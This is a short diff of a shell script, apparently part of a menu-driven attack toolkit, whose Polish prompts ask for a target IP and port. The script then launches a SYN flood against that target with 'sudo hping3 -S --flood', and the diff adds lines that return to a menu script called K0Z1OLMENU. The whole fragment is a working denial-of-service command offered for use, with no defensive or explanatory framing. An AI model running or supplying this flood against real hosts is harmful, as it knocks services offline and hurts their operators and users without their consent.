@@ -12,4 +12,6 @@ read IP
 echo "Podaj port celu: "
 read PORT
 sudo hping3 -S --flood -V -p $PORT $IP
+cd ..
+sudo ./K0Z1OLMENU
 
